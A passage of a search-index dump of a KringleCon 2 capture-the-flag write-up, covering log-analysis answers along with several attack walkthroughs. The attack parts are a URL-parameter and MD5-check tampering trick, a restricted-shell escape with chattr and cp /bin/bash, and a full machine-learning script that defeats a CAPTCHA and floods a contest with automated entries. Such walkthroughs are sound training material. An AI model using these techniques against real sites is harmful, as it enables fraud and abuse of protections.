Challenge","title":"Escape Ed - Terminal Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#escape-ed-solution","text":"Kringlecon 2 - Escape Ed - Terminal Challenge Answer: Press q and press Enter. Message from Bushy Evergreen after solving the challenge: Kringlecon 2 - Objective 3 Hint","title":"Escape Ed - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-3-walkthrough","text":"After you solve the terminal challenge, you learn about Deep Blue CLI. You download Deep Blue CLI and run it against the 'security.evtx' file for the challenge. Deep Blue CLI - Partial result of '.\\DeepBlue.ps1 .\\Security.evtx ' Deep Blue CLI - Partial result of '.\\DeepBlue.ps1 .\\Security.evtx ' When you view the Total Logon Failures, you quickly notice that all except one account have '77' failures. This may indicate that the account was authenticated successfully on the 77 th attempt.","title":"Objective 3 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-3-solution","text":"Deep Blue CLI - Partial result of '.\\DeepBlue.ps1 .\\Security.evtx ' Answer: supatree \\pagebreak","title":"Objective 3 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-4-windows-log-analysis-determine-attacker-technique","text":"Inspirational Quote \"Go Hack it!\" -kaknowles Objective Using these normalized Sysmon logs, identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary. Difficulty Level: 2 Links sysmon-data.json.zip Related Video","title":"Objective 4 - Windows Log Analysis: Determine Attacker Technique"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#linux-path-terminal-challenge","text":"Elf Name SugarPlum Mary Pre-Solve Hints Green words matter, files must be found, and the terminal's $PATH matters. Post-Solve Hints EQL Threat Hunting , Sysmon By Carlos Perez Objective Kringlecon 2 - Linux Path You open the terminal. Kringlecon 2 - Linux Path Terminal The objective is to get a listing of the current directory. You try the obvious solutions. Kringlecon 2 - 'ls' and 'dir' You remember the objective mentions that green words matter. Kringlecon 2 - which ls You try to find other programs that start with 'ls' . Kringlecon 2 - locate '/ls/ You check the Path. Kringlecon 2 - echo $PATH You run '/bin/ls' to get dir listing.","title":"Linux Path - Terminal Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#linux-path-solution","text":"Kringlecon 2 - '/bin/ls' Kringlecon 2 - 'rejected-elfu-logos.txt' Answer: /bin/ls Message from SugarPlum Mary after solving the challenge: Kringlecon 2 - 'rejected-elfu-logos.txt'","title":"Linux Path - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-4-walkthrough","text":"You read the hints provided by SugarPlum Mary. You run the following three queries to solve this challenge: Query 1: $ eql query -f sysmon-data.json \"process where process_name = 'lsass.exe'\" Query 1 gives you no results. You continue your journey with query 2. Query 2: $ eql query -f sysmon-data.json \"process where parent_process_name = 'lsass.exe'\" > results.json You receive the following results from Query 2: Kringlecon 2 - Query 2 results You pivot on PID and run Query 3. Query 3: eql query -f sysmon-data.json \"process where ppid = 3440\" > results.json You get the following result: Kringlecon 2 - Query 3 results","title":"Objective 4 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-4-solution","text":"Answer: ntdsutil \\pagebreak","title":"Objective 4 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-5-network-log-analysis-determine-compromised-system","text":"Inspirational Quote \"Tackle problems one step at a time. Take regular cocoa breaks!!\" - kaknowles Objective The attacks don't stop! Can you help identify the IP address of the malware-infected system using these Zeek logs? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry. Difficulty Level: 2 Links Zeek logs Related Video John Strand, Keynote: A Hunting We Must Go","title":"Objective 5 - Network Log Analysis: Determine Compromised System"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#xmas-cheer-laser-terminal-challenge","text":"Elf Name Sparkle Redberry Pre-Solve Hints SANS' PowerShell Cheat Sheet Post-Solve Hints RITA's homepage Objective Kringlecon 2 - Xmas Cheer Laser - Terminal Challenge You load the terminal for this challenge. Kringlecon 2 - Xmas Cheer Laser - Terminal Challenge You run the command (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info. Kringlecon 2 - Invoke-WebRequest -Uri http://localhost:1225/).RawContent You do a directory listing to see what files are in the current directory. You read the callingcard. Kringlecon 2 - Callingcard.txt The calling card has references to history. You view the history. Kringlecon 2 - 'history' You notice Item 7 and 9 in history looks interesting. You make a note of Item 7, (Invoke-WebRequest -Uri http://localhost:1225/api/angle?val=65.5).RawContent . You're unable to read all of item 9, you dump history with all the properties. Kringlecon 2 - riddle in history You ponder on the riddle in the history item for a little while... You realize the riddle is referring to environment variables. You view the environment variables in the terminal. Kringlecon 2 - Environment variables You notice an environment variable named 'riddle'. You can't view the full content of the variable. You use out-string width 4096 to view more. You view the content of this environment variable. Kringlecon 2 - Environment variables expanded You compose a command line to search /etc recursively to look for the newest file that is likely compressed. get-childitem -Path /etc \u2013recurse -ErrorAction SilentlyContinue | where-object {$_.lastwritetime -gt (get-date).addDays(-1)} | where-object {-not $_.PSIsContainer} | Foreach-Object { $_.FullName + \" \" + $_.lastwritetime} Kringlecon 2 - Riddle solution You expand the 'archive' file using the command Expand-Archive -LiteralPath /etc/apt/archive -DestinationPath /home/elf/archive . Kringlecon 2 - Expanding 'archive' file You examine the content. Kringlecon 2 - dir 'archive' file Kringlecon 2 - dir 'archive' file You find two files, another riddle and runme.elf . You read the riddle. Kringlecon 2 - riddle in 'archive' file You have difficulty running the runme.elf . You google how to run elf file, you find the following article: Kringlecon 2 - how to run 'elf' file You try changing the attribute of the file prior to running it. Kringlecon 2 - 'runme.elf' You make a note of the refraction value. You use the following powershell command to find a file with the specified md5 hash. Get-ChildItem /home/elf -File -Recurse | Select DirectoryName,Name,@{N='Version';E={$_.VersionInfo.ProductVersion}},LastWriteTime,Length,@{N='FileHash';E={(Get-FileHash -Algorithm MD5 $_).Hash}} | select-string \"25520151A320B5B0D21561F92C8F6224\" Kringlecon 2 - File with MD5 hash \"25520151A320B5B0D21561F92C8F6224\" You view this file. Kringlecon 2 - Another riddle You make a note of the temperature. You find another riddle in this file. You create the following powershell command to solve the riddle: get-childitem -Path /home/elf/depths/ \u2013recurse -ErrorAction SilentlyContinue | Foreach-Object { $_.FullName } | sort { $_.length } | The results are as follow: Kringlecon 2 - Riddle solution Kringlecon 2 - Yet another riddle. You use the following powershell command to solve the above riddle. Get-Process -IncludeUserName | Select-Object Id,Name,Username,Path Stop-Process -ID 23 -Force Stop-Process -ID 26 -Force Stop-Process -ID 27 -Force Stop-Process -ID 29 -Force Kringlecon 2 - Yet another riddle. You do a dir listing of /shall to find another riddle. You use the following powershell command to solve this riddle. get-childitem -Path /etc *.xml \u2013recurse -ErrorAction SilentlyContinue Kringlecon 2 - Riddle solution You ponder on how to this. After a while you try the following command: type /etc/systemd/system/timers.target.wants/EventLog.xml | Select-String \"<I32 N=\"\"Id\"\">\" | Group-Object Kringlecon 2 - lonely event id You use the following powershell command to get the properties of the lonely event id. type /etc/systemd/system/timers.target.wants/EventLog.xml | Select-String \"<I32 N=\"\"Id\"\">1</I32>\" -Context 1,150 Kringlecon 2 -'$correct_gases_postbody' You make a note of the correct gases. Now you have the temperature, angle, gas composition, refraction value. You set the correct parameters on the laser.","title":"Xmas Cheer Laser - Terminal Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#xmas-cheer-laser-solution","text":"Answer: ( Invoke-WebRequest -Uri http :// localhost : 1225 / api / off ). RawContent ( Invoke-WebRequest -Uri http :// localhost : 1225 / api / refraction ? val = 1 . 867 ). RawContent ( Invoke-WebRequest -Uri http :// localhost : 1225 / api / temperature ? val =- 33 . 5 ). RawContent ( Invoke-WebRequest -Uri http :// localhost : 1225 / api / angle ? val = 65 . 5 ). RawContent $correct_gases_postbody = \"O=6&H=7&He=3&N=4&Ne=22&Ar=11&Xe=10&F=20&Kr=8&Rn=9\" Invoke-WebRequest -Uri http :// localhost : 1225 / api / gas -Method POST -Body $correct_gases_postbody ( Invoke-WebRequest -Uri http :// localhost : 1225 / api / on ). RawContent Xmas Cheer Laser - Solution Message from Sparkle Redberry after solving the challenge: Xmas Cheer Laser - Solution","title":"Xmas Cheer Laser - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-5-walkthrough","text":"You read the Rita hint from the terminal challenge and watch the related video. You're now a RITA expert! You extract the Zeek files provided in this challenge. You view the RITA output. You view the Beacons: RITA - Beacons","title":"Objective 5 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-5-solution","text":"Answer: 144.202.46.214 \\pagebreak","title":"Objective 5 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-6-splunk","text":"Inspirational Quote \"Set boundaries (time, abuse, triggers, requests, pancakes...)\" -hacks4pancake Objective Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas. Difficulty Level: 3 Links https://splunk.elfu.org/ Related Video James Brodsky, Dashing Through the Logs","title":"Objective 6 - Splunk"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#splunk-training-questions-terminal-challenge","text":"Elf Name Professor Banas Objective Kringlecon 2 - Splunk Training You proceed to login to https://splunk.elfu.org/ wither username elf/Password:elfsocks . Once you log in, you're greeted with the following messages: Kringlecon 2 - https://splunk.elfu.org/ welcome page Kringlecon 2 - https://splunk.elfu.org/ ELF University SOC The various Chats will help you answer the training questions and the challenge questions. Here is the list of the questions: Question 1: What is the short host name of Professor Banas' computer? Question 2: What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\\temp\\report.pdf) Question 3: What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com) Question 4: What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt) Question 5: How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1) Question 6: What was the password for the zip archive that contained the suspicious file? You work with the users in SOC to answer these questions. They walk you through answering each question. You read the chat and perform the searches, review the results to answer the questions. For question 1 you review #ELFU SOC chat log. For question 2, you search index=main santa and review the results. For question 3, you search for index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3 For question 4, you search for index=main sourcetype=WinEventLog EventCode=4688 | reverse and review the events. For question 5, you search for index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body | search results{}.workers.smtp.subject=\"*Holiday Cheer Assignment Submission*\" results{}.workers.smtp.to=\"*carl*\" For question 6, you can find the password in the malicious email carl received in question 5.","title":"Splunk Training Questions - Terminal Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#splunk-training-questions-solution","text":"Kringlecon 2 - Training Questions/Answers Answer: Training Questions 1. sweetums 2. C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txt 3. 144.202.46.214.vultr.com 4. 19th Century Holiday Cheer Assignment.docm 5. 21 6. 123456789 7. Bradly.Buttercups@eIfu.org","title":"Splunk Training Questions - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-6-walkthrough","text":"Challenge Question: What was the message for Kent that the adversary embedded in this attack? Alice Bluebeard assists you with this challenge. Here is a list of files of interest: Kringlecon 2 - List of interesting files You will use the following splunk search get a list of files that may contain the message for Kent: index=main sourcetype=stoq \"results{}.workers.smtp.from\"=\"bradly buttercups <bradly.buttercups@eifu.org>\" | eval results = spath(_raw, \"results{}\") | mvexpand results | eval path=spath(results, \"archivers.filedir.path\"), filename=spath(results, \"payload_meta.extra_data.filename\"), fullpath=path.\"/\".filename | search fullpath!=\"\" | table filename,fullpath You will get the following results: Kringlecon 2 - Files Looking at the malicious file you get the following message: Kringlecon 2 - malicious file You try a different file and see the following: Kringlecon 2 - xml file","title":"Objective 6 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-6-solution","text":"Answer: Kent you are so unfair. And we were going to make you the king of the Winter Carnival. Kringlecon 2 - Challenge Answer Kringlecon 2 - Challenge Answer \\pagebreak","title":"Objective 6 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-7-get-access-to-the-steam-tunnels","text":"Inspirational Quote \"Deep breath, Loook at the data!\" - Random Math Professor standing behind you Objective Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane. Difficulty Level: 3 Links Key Decoding Related Video Deviant Ollam, Optical Decoding of Keys Prior to accessing the terminal challenge we need to unlock the dorm room.","title":"Objective 7 - Get Access To The Steam Tunnels"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#frosty-keypad-challenge","text":"Here is the keypad to access the dorm room: Kringlecon 2 - Frosty Keypad The Elf Tangle Coalbox by the dorm door gives you the following hints: Kringlecon 2 - Elf Tangle Coalbox Kringlecon 2 - Frosty Keypad Hints From the keypad and the hints you can tell the three keys in the code are '1', '3' and '7'. You write the following python function to find all the 4 digit prime numbers with only the digits '1', '3', '7'. # prime function from https://stackoverflow.com/questions/15285534/isprime-function-for-python-language def is_prime ( n ): if n == 2 or n == 3 : return True if n < 2 or n % 2 == 0 : return False if n < 9 : return True if n % 3 == 0 : return False r = int ( n ** 0.5 ) f = 5 while f <= r : #print ('\\t',f) if n % f == 0 : return False if n % ( f + 2 ) == 0 : return False f += 6 return True # Program to check if a number is prime or not # for number in range(1000:10000) for number in range ( 1000 , 10000 ): x = str ( number ) #print(x + ' is Prime.') if ( x . find ( '1' ) >- 1 and x . find ( '3' ) >- 1 and x . find ( '7' ) >- 1 ): if ( x . find ( '0' ) == - 1 and x . find ( '2' ) == - 1 and x . find ( '4' ) == - 1 and x . find ( '5' ) == - 1 and x . find ( '6' ) == - 1 and x . find ( '8' ) == - 1 and x . find ( '9' ) == - 1 ): if is_prime ( number ): print ( x + ' is Prime.' ) Here are the result of the above program: Kringlecon 2 - Frosty Keypad Possible Combinations","title":"Frosty Keypad Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#frosty-keypad-solution","text":"You try all the above combinations and find the correct combination is 7331 . Once you enter the dorm room, you notice that the combination is written on the wall. Kringlecon 2 - Dorm Room - Bad Security","title":"Frosty Keypad - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#holiday-hack-trial-terminal-challenge","text":"Elf Name Misty CandyCane Pre-Solve Hints Web Apps: A Trailhead Post-Solve Hints Deviant's Key Decoding Templates , Optical Decoding of Keys Objective Kringlecon 2 - Minty Candycane The game has 3 difficulty levels. You notice a URL on top of the game page. Kringlecon 2 - Holiday Hack Trail - Terminal Challenge","title":"Holiday Hack Trial - Terminal Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#easy-mode","text":"You select the EASY mode. You notice the URL on top of the game has changed. Kringlecon 2 - Easy mode You copy and paste the URI to a text editor: hhc://trail.hhc/trail/?difficulty=0&distance=0&money=3600&pace=0&curmonth=7&curday=1&reindeer=4&runners=4&ammo=100&meds=20&food=400&name0=Anna&health0=100&cond0=0&causeofdeath0=&deathday0=0&deathmonth0=0&name1=Michael&health1=100&cond1=0&causeofdeath1=&deathday1=0&deathmonth1=0&name2=Billy&health2=100&cond2=0&causeofdeath2=&deathday2=0&deathmonth2=0&name3=Vlad&health3=100&cond3=0&causeofdeath3=&deathday3=0&deathmonth3=0 You update the distance variable in the URL to 8000 and press the > . You press the Go button and you get the following message: Kringlecon 2 - Terminal Challenge Solved","title":"Easy mode"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#medium-mode","text":"You start the game again on Medium difficulty. You notice the URL bar has changed. You no longer can modify the variables in the URL to win. Kringlecon 2 - Medium mode You inspect the elements on the page and find a div 'statusContainer' that contains hidden variables. Kringlecon 2 - statusContainer You modify the distance variable to 8000 and press \"Go\". Kringlecon 2 - distance variable","title":"Medium mode"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#hard-mode","text":"You start the game in hard difficulty mode. The solutions for the last two mode no longer work. You examine the 'statusContainer and notice now it contains a hash value. Kringlecon 2 - hash You type the hash in Crackstation . You get the following result: Kringlecon 2 - md5 hash The hash 6da9003b743b65f4c0ccd295cc484e57 is a md5 hash for 230 . After playing around with the game for a while, you notice the hash is calculated by adding all the values together. The Values added are money, distance, curmonth, curday, runners,reindeer, ammo, meds, food. You restart the game. You add calculate the md5 hash of (8000+230). You use CyberChef to calculate the hash. The hash is bd4a6d0563e0604510989eb8f9ff71f5 You update the distance to 8000 and hash to the above and press Go .","title":"Hard mode"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#holiday-hack-trial-solution","text":"Answer: Easy: hhc://trail.hhc/trail/?difficulty=0&distance=8000&money=3600&pace=0&curmonth=7&curday=1&reindeer=4&runners=4&ammo=100&meds=20&food=400&name0=Anna&health0=100&cond0=0&causeofdeath0=&deathday0=0&deathmonth0=0&name1=Michael&health1=100&cond1=0&causeofdeath1=&deathday1=0&deathmonth1=0&name2=Billy&health2=100&cond2=0&causeofdeath2=&deathday2=0&deathmonth2=0&name3=Vlad&health3=100&cond3=0&causeofdeath3=&deathday3=0&deathmonth3=0 Medium: Modify the distance variable in div \"statusContainer\" to 8000 and press \"Go\". Hard: You use the same solution as Medium, except you update the hash. The hash is md5(sum(money, distance, curmonth, curday, runners,reindeer, ammo, meds, food)) Message from Minty Candycane after solving the challenge: Kringlecon 2 - Minty Candycane - Terminal Challenge","title":"Holiday Hack Trial - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-7-walkthrough","text":"You watch the video for this challenge. You review the elements on the page and notice a class called \"krampus scampering\". Kringlecon 2 - \"krampus scampering\" You open the image mentioned in the krampus class in your browser. Kringlecon 2 - krampus.png You cut the key image and rotate it. Kringlecon 2 - krampus's key You have two options, use the templates provided for the challange or try to eyeball it. You decide to eyeball it. You trying the following combinations 133430 133530 133630 133730 233530 122420 122520(answer) The door opens up with 122520 key. Kringlecon 2 - Door opened by key `122520` Kringlecon 2 - Key `122520` You through the door and down the steam tunnel. You reach the end of the steam tunnel. Kringlecon 2 - Krampus / Frido Sleigh Contest Kringlecon 2 - Krampus Hollyfeld","title":"Objective 7 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-7-solution","text":"Answer: Krampus Hollyfeld \\pagebreak","title":"Objective 7 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-8-bypassing-the-frido-sleigh-capteha","text":"Inspirational Quote \"Being devious is half of the fun!\" -kaknowles Objective Help Krampus beat the Frido Sleigh contest. For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room. Difficulty Level: 4 Links Frido Sleigh contest , 12,000 images , API interface Related Video Chris Davis, Machine Learning Use Cases for Cybersecurity","title":"Objective 8 - Bypassing the Frido Sleigh CAPTEHA"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#nyanshell-terminal-challenge","text":"Elf Name Alabaster Snowball Pre-Solve Hints On Linux, a user's shell is determined by the contents of /etc/passwd, sudo -l says I can run a command as root. What does it do? Post-Solve Hints Chris Davis, Machine Learning Use Cases for Cybersecurity Objective You arrive in the Speaker Unpreparedness Room. Kringlecon 2 - Speaker Unpreparedness Room You talk to Alabaster Snowball. Kringlecon 2 - Alabaster Snowball - Terminal Challenge You open the Nyanshell. Kringlecon 2 - Nyanshell - Terminal Challenge You run sudo -l to see the list of files you can and can't run with sudo permission. Kringlecon 2 - sudo -l Kringlecon 2 - /etc/passwd You look around in different folders, and you find a file / entrypoint.sh Kringlecon 2 - entrypoint.sh You try running entrypoint.sh . You check the attribute of /bin/nsh using lsattr /bin/nsh command. You notice /bin/nsh is marked as immutable. Kringlecon 2 - getting attribute of /bin/nsh You change this attribute by using sudo chattr -i /bin/nsh command. You copy /bin/bash over /bin/nsh Kringlecon 2 - changing nsh from immutable to mutable You login as alabaster_snowball with the username provided on loading of the terminal (alabaster_snowball/Password2). Kringlecon 2 - su alabaster_snowball You run the success script after. Kringlecon 2 - running the success script Kringlecon 2 - nyancat","title":"Nyanshell - Terminal Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#nyanshell-solution","text":"Answer: sudo chattr -i /bin/nsh cp /bin/bash /bin/nsh su alabaster_snowball with password: \"Password2\" Message from Alabaster Snowball after solving the challenge: Kringlecon 2 - Nyanshell solved","title":"Nyanshell - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-8-walkthrough","text":"You view the website for the contest, Frido Sleigh contest . The website has a complex captcha puzzle. Kringlecon 2 - Contest Captcha You watch the related video for this objective. You download all the related files for this section. 12,000 images API interface You download the repository from the video img_rec_tf_ml_demo . You follow the instructions on the img_rec_tf_ml_demo github page to install Tensorflow: Kringlecon 2 - TensorFlow installation You run the demo to ensure you get the coprrect results. Kringlecon 2 - TensorFlow Demo You download capteha_api.py file and copy it to the demo tensorflow folder. You extract the 12,000 images you downloaded by running the following commands: mkdir training_images tar xvzf capteha_images.tar.gz -C ./training_images You remove the demo model training files, rm -r /tmp/retrain_tmp/ . You retrain with model with the capteha_images. Kringlecon 2 - Training Model 1/2 Kringlecon 2 - Training Model 2/2 You review capteha_api.py and predict_images_using_trained_model.py from the tensorflow demo. You add capteha_api.py to predict_images_using_trained_model.py file. You write the code the extra code to use ML model to solve the captcha. #!/usr/bin/python3 # Image Recognition Using Tensorflow Exmaple. # Code based on example at: # https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py import os os . environ [ 'TF_CPP_MIN_LOG_LEVEL' ] = '3' import tensorflow as tf tf . logging . set_verbosity ( tf . logging . ERROR ) import numpy as np import threading import queue import time import sys import requests import json import base64 from array import * # sudo apt install python3-pip # sudo python3 -m pip install --upgrade pip # sudo python3 -m pip install --upgrade setuptools # sudo python3 -m pip install --upgrade tensorflow==1.15 def load_labels ( label_file ): label = [] proto_as_ascii_lines = tf . gfile . GFile ( label_file ) . readlines () for l in proto_as_ascii_lines : label . append ( l . rstrip ()) return label def predict_image ( q , sess , graph , image_bytes , img_full_path , labels , input_operation , output_operation ): image = read_tensor_from_image_bytes ( image_bytes ) results = sess . run ( output_operation . outputs [ 0 ], { input_operation . outputs [ 0 ]: image }) results = np . squeeze ( results ) prediction = results . argsort ()[ - 5 :][:: - 1 ][ 0 ] q . put ( { 'img_full_path' : img_full_path , 'prediction' : labels [ prediction ] . title (), 'percent' : results [ prediction ]} ) def load_graph ( model_file ): graph = tf . Graph () graph_def = tf . GraphDef () with open ( model_file , \"rb\" ) as f : graph_def . ParseFromString ( f . read ()) with graph . as_default (): tf . import_graph_def ( graph_def ) return graph def read_tensor_from_image_bytes ( imagebytes , input_height = 299 , input_width = 299 , input_mean = 0 , input_std = 255 ): image_reader = tf . image . decode_png ( imagebytes , channels = 3 , name = \"png_reader\" ) float_caster = tf . cast ( image_reader , tf . float32 ) dims_expander = tf . expand_dims ( float_caster , 0 ) resized = tf . image . resize_bilinear ( dims_expander , [ input_height , input_width ]) normalized = tf . divide ( tf . subtract ( resized , [ input_mean ]), [ input_std ]) sess = tf . compat . v1 . Session () result = sess . run ( normalized ) return result def main (): # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory graph = load_graph ( '/tmp/retrain_tmp/output_graph.pb' ) labels = load_labels ( \"/tmp/retrain_tmp/output_labels.txt\" ) # Load up our session input_operation = graph . get_operation_by_name ( \"import/Placeholder\" ) output_operation = graph . get_operation_by_name ( \"import/final_result\" ) sess = tf . compat . v1 . Session ( graph = graph ) ### capteha_api.py #yourREALemailAddress = \"YourRealEmail@SomeRealEmailDomain.RealTLD\" yourREALemailAddress = \"mo@.SomeRealEmailDomain.RealTLD.org\" # Creating a session to handle cookies s = requests . Session () url = \"https://fridosleigh.com/\" print ( \"Sending capteha request...\" ) json_resp = json . loads ( s . get ( \" {} api/capteha/request\" . format ( url )) . text ) b64_images = json_resp [ 'images' ] # A list of dictionaries eaching containing the keys 'base64' and 'uuid' challenge_image_type = json_resp [ 'select_type' ] . split ( ',' ) # The Image types the CAPTEHA Challenge is looking for. challenge_image_types = [ challenge_image_type [ 0 ] . strip (), challenge_image_type [ 1 ] . strip (), challenge_image_type [ 2 ] . replace ( ' and ' , '' ) . strip ()] # cleaning and formatting print ( \"Challenge types:\" + str ( challenge_image_types )) # Can use queues and threading to spead up the processing q = queue . Queue () unknown_images_dir = 'unknown_images' unknown_images = os . listdir ( unknown_images_dir ) #Going to interate over each of our images. #for image in unknown_images: for image in b64_images : print ( \"img uuid:\" + str ( image [ 'uuid' ])) # https://stackoverflow.com/questions/16214190/how-to-convert-base64-string-to-image imgdata = base64 . b64decode ( image [ 'base64' ]) #img_full_path = '{}/{}'.format(unknown_images_dir, image) #print('Processing Image {}'.format(img_full_path)) # We don't want to process too many images at once. 10 threads max while len ( threading . enumerate ()) > 10 : time . sleep ( 0.0001 ) #predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object #image_bytes = open(img_full_path,'rb').read() image_bytes = imgdata #threading.Thread(target=predict_image, args=(q, sess, graph, image_bytes, img_full_path, labels, input_operation, output_operation)).start() threading . Thread ( target = predict_image , args = ( q , sess , graph , image_bytes , str ( image [ 'uuid' ]), labels , input_operation , output_operation )) . start () print ( 'Waiting For Threads to Finish...' ) while q . qsize () < len ( b64_images ): time . sleep ( 0.001 ) #getting a list of all threads returned results prediction_results = [ q . get () for x in range ( q . qsize ())] final_answer = \"\" #do something with our results... Like print them to the screen. for prediction in prediction_results : if any ( image_type in str ( prediction [ \"prediction\" ]) for image_type in challenge_image_types ): final_answer = final_answer + str ( prediction [ \"img_full_path\" ]) + \",\" print ( str ( prediction )) print ( 'TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy' . format ( ** prediction ) + str ( challenge_image_types )) ### capteha_api.py final_answer = final_answer . rstrip ( ',' ) print ( \"final answer:\" + final_answer ) # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type . #final_answer = ','.join( [ img['uuid'] for img in b64_images ] ) json_resp = json . loads ( s . post ( \" {} api/capteha/submit\" . format ( url ), data = { 'answer' : final_answer }) . text ) if not json_resp [ 'request' ]: # If it fails just run again. ML might get one wrong occasionally print ( 'FAILED MACHINE LEARNING GUESS' ) print ( '-------------------- \\n Our ML Guess: \\n -------------------- \\n {} ' . format ( final_answer )) print ( '-------------------- \\n Server Response: \\n -------------------- \\n {} ' . format ( json_resp [ 'data' ])) sys . exit ( 1 ) print ( 'CAPTEHA Solved!' ) # If we get to here, we are successful and can submit a bunch of entries till we win userinfo = { 'name' : 'Krampus Hollyfeld' , 'email' : yourREALemailAddress , 'age' : 180 , 'about' : \"Cause they're so flippin yummy!\" , 'favorites' : 'thickmints' } # If we win the once-per minute drawing, it will tell us we were emailed. # Should be no more than 200 times before we win. If more, somethings wrong. entry_response = '' entry_count = 1 while yourREALemailAddress not in entry_response and entry_count < 200 : print ( 'Submitting lots of entries until we win the contest! Entry # {} ' . format ( entry_count )) entry_response = s . post ( \" {} api/entry\" . format ( url ), data = userinfo ) . text entry_count += 1 print ( entry_response ) if __name__ == \"__main__\" : main () You run the combined code, you get the following results: Kringlecon 2 - Solving CAPTEHA Kringlecon 2 - CAPTEHA Solved!! Kringlecon 2 - You won! After a few minutes you receive this email to notify you of your winning. Kringlecon 2 - Winner notification.","title":"Objective 8 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-8-solution","text":"Answer: 8Ia8LiZEwvyZr2WO \\pagebreak","title":"Objective 8 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-9-retrieve-scraps-of-paper-from-server","text":"Inspirational Quote \"If you need answer, talk to a rubber duck!\" -kaknowles Objective Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix. Difficulty Level: 4 Links Student Portal Related Video","title":"Objective 9 - Retrieve Scraps of Paper from Server"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#graylog-terminal-challenge","text":"Elf Name Pepper Minstix Pre-Solve Hints Graylog Docs , (Events and Sysmon) Post-Solve Hints Sqlmap Tamper Scripts , SQL Injection from OWASP Objective Kringlecon 2 - Graylog - Terminal Challenge You read the Graylog Docs. You start the terminal challenge and login with credential elfustudent/elfustudent . You use various search parameters to find the answers to the questions. Kringlecon 2 - Graylog Incident Response Report - Terminal Challenge","title":"Graylog - Terminal Challenge"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#graylog-solution","text":"Answer: ElfU Graylog Incident Response Report Graylog Login: elfustudent/elfustudent. Question 1: Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file. What is the full-path + filename of the first malicious file downloaded by Minty? Answer: C:\\Users\\minty\\Downloads\\cookie_recipe.exe Hint: We can find this searching for sysmon file creation event id 2 with a process named firefox.exe and not junk .temp files. We can use regular expressions to include or exclude patterns: TargetFilename:/.+\\.pdf/ Question 2: The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first? Answer: 192.168.247.175:4444 Hint: We can pivot off the answer to our first question using the binary path as our ProcessImage Question 3: What was the first command executed by the attacker? (answer is a single word) Answer: C:\\Windows\\system32\\cmd.exe /c \"whoami \" Hint: 